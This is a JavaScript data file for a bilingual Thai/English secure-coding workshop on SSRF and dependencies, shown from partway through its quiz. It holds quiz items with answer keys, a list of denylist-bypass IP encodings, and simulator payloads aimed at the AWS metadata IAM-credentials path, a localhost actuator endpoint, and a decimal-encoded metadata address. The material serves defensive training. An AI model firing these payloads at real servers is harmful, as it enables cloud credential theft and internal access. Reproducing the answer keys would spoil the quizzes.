          { th: 'พอแล้ว เพราะปิดทางเข้าถึงตัว server เองได้หมด', en: 'Yes — it closes off access to the server itself' },
          { th: 'ไม่พอ ยังมี [::1], 2130706433, 0177.0.0.1, ชื่อ DNS ที่ชี้กลับเข้ามา และ 302 redirect เข้าปลายทางภายในอีกมาก', en: 'No — there are still [::1], 2130706433, 0177.0.0.1, DNS names pointing back inside, and 302 redirects into internal destinations' },
          { th: 'พอแล้ว ถ้าเพิ่ม "169.254.169.254" เข้า denylist ด้วย', en: 'Yes, if you also add "169.254.169.254" to the denylist' },
          { th: 'พอแล้ว ถ้าบังคับให้ใช้ HTTPS ทุก request', en: 'Yes, if you force HTTPS on every request' }
        ],
        answer: 1,
        why: {
          th: 'denylist ของสตริงมีทางเลี่ยงมากเกินกว่าจะไล่ปิดครบ ทั้ง encoding ของ IP (ฐานสิบ/ฐานแปด/IPv6), DNS ที่ชี้เข้า private IP และ TOCTOU/DNS rebinding วิธีที่ถูกคือ allowlist ของ host + resolve เป็น IP จริงแล้วเช็คช่วง internal + ปิด redirect',
          en: 'A string denylist has far too many bypasses to cover: IP encodings (decimal/octal/IPv6), DNS pointing at private IPs, and TOCTOU/DNS rebinding. The correct approach is a host allowlist + resolving to the real IP and checking internal ranges + disabling redirects.'
        },
        whyWrong: [
          { th: 'มันปิดแค่ "สองสตริง" ไม่ได้ปิด IP ตัวเดียวกันในรูปแบบอื่น และไม่ได้แตะ metadata service หรือ private IP อื่น ๆ เลย', en: 'It blocks only two strings, not the same IP in other forms, and never touches the metadata service or other private IPs.' },
          null,
          { th: 'การไล่เพิ่มทีละสตริงคือเกมที่แพ้เสมอ 169.254.169.254 ยังเขียนเป็นเลขฐานสิบ/ฐานแปด/IPv6 ได้อีก', en: 'Adding strings one by one is a losing game; 169.254.169.254 can still be written in decimal/octal/IPv6.' },
          { th: 'HTTPS เข้ารหัสการเชื่อมต่อแต่ไม่ได้จำกัดว่า "จะต่อไปที่ไหน" attacker ก็ยังชี้ไป https://169.254... ได้', en: 'HTTPS encrypts the connection but does not limit where it goes; an attacker can still point at https://169.254...' }
        ]
      },
      {
        q: {
          th: 'วิธีที่ถูกต้องที่สุดในการกัน SSRF คือข้อใด',
          en: 'Which is the most correct way to prevent SSRF?'
        },
        choices: [
          { th: 'ทำ denylist ของช่วง IP ภายในทุกช่วงให้ครบ', en: 'Build a complete denylist of every internal IP range' },
          { th: 'allowlist ของ host ที่อนุญาต + ตรวจ scheme + resolve เป็น IP แล้วเช็คว่าไม่ใช่ internal + ปิดการตาม redirect', en: 'A host allowlist + scheme check + resolve to IP and verify it is not internal + disable redirect following' },
          { th: 'ตรวจว่า hostname ไม่ใช่ IP ภายในก่อนยิง โดยดูจากสตริง hostname เท่านั้น', en: 'Check the hostname is not an internal IP before fetching, from the hostname string alone' },
          { th: 'จำกัดขนาด response ที่ดึงกลับมาให้เล็ก', en: 'Limit the size of the fetched response' }
        ],
        answer: 1,
        why: {
          th: 'การป้องกันที่แข็งแรงต้องรวมหลายชั้น: allowlist ของปลายทางที่ตั้งใจ + จำกัด scheme + ตรวจ IP จริงหลัง resolve (กัน DNS rebinding) + ปิด redirect (กัน 302 เข้า metadata) การเช็ค IP หลัง resolve คือชั้นที่ปิดช่องจริง',
          en: 'Robust prevention combines layers: an allowlist of intended destinations + scheme restriction + checking the real IP after resolution (against DNS rebinding) + disabling redirects (against a 302 into metadata). Checking the IP after resolution is the layer that truly closes the hole.'
        },
        whyWrong: [
          { th: 'denylist ต้องครบทุกกรณีตลอดไปจึงจะกันได้ ส่วน attacker ขอถูกแค่ครั้งเดียว และยังมี encoding/redirect ให้เลี่ยง', en: 'A denylist must be exhaustive forever to work, while an attacker only needs one gap — and encodings/redirects remain.' },
          null,
          { th: 'การเช็คแต่สตริง hostname โดยไม่ resolve คือจุดอ่อนของ TOCTOU/DNS rebinding: ตอนต่อจริง DNS ชี้เข้า private IP ได้', en: 'Checking only the hostname string without resolving is exactly the TOCTOU/DNS-rebinding weakness: at connect time DNS can point at a private IP.' },
          { th: 'การจำกัดขนาด response ลดผลบางส่วนแต่ไม่ได้กันการยิงเข้าปลายทางภายในหรือการขโมย credentials จาก metadata', en: 'Limiting response size mitigates a little but does not stop reaching internal destinations or stealing metadata credentials.' }
        ]
      }
    ],

    sim: {
      kind: 'ssrf',
      config: {
        allowHosts: ['api.partner.example.com', 'cdn.example.com']
      },
      payloads: [
        { label: { th: 'หลอกให้ server ไปดึง credentials จาก AWS metadata', en: 'Classic AWS metadata — steal IAM credentials' }, value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
        { label: { th: 'Loopback — เข้าถึง actuator/admin ที่ผูกกับ localhost', en: 'Loopback — reach actuator/admin bound to localhost' }, value: 'http://127.0.0.1:8080/actuator/env' },
        { label: { th: 'เลขฐานสิบ — เลี่ยง denylist แต่ resolve เป็น 169.254.169.254', en: 'Decimal-encoded — evades a denylist but resolves to 169.254.169.254' }, value: 'http://2852039166/latest/meta-data/iam/security-credentials/' }
      ],
      allowCustom: true
    },

    references: [
      { label: 'OWASP Server Side Request Forgery Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html' },
      { label: 'OWASP Top 10 — A10:2021 Server-Side Request Forgery', url: 'https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/' },
      { label: 'CWE-918: Server-Side Request Forgery (SSRF)', url: 'https://cwe.mitre.org/data/definitions/918.html' }
    ]
  };

  const WORKSHOP = {
    id: 'w4',
    order: 4,
    title: {
      th: 'Workshop 4: Dependency, ไฟล์อัปโหลด & Server-Side Request',
      en: 'Workshop 4: Dependencies, Files & Server-Side Requests'
    },
    summary: {
      th: 'Workshop นี้เน้นข้อมูลและส่วนประกอบที่มาจากภายนอกระบบ เช่น ไฟล์อัปโหลด, dependency, URL ปลายทาง และข้อมูลที่ถูก deserialize ซึ่งทุกอย่างต้องถูกตรวจอย่างเหมาะสมก่อนนำไปใช้',
      en: 'Vulnerabilities that come from trusting things from the outside: uploaded files, dependency versions, outbound URLs, and deserialized bytes.'
    },
    goal: {
      th: 'จบ workshop นี้ คุณจะรับไฟล์อัปโหลดอย่างปลอดภัย, ดูแล dependency ไม่ให้ค้างอยู่บนเวอร์ชันที่มีช่องโหว่, ป้องกัน SSRF และหลีกเลี่ยง native deserialization กับข้อมูลจากภายนอก',
      en: 'After this workshop you will handle file uploads safely, keep dependency versions free of known vulnerabilities, prevent SSRF, and stop using native deserialization on external data.'
    },
    exercises: [ VULN_DEPS, SSRF ]
  };

  global.SCW = global.SCW || { workshops: [], registerWorkshop: function (w) { this.workshops.push(w); } };
  global.SCW.registerWorkshop(WORKSHOP);
  if (typeof module !== 'undefined' && module.exports) module.exports = WORKSHOP;
})(typeof window !== 'undefined' ? window : globalThis);
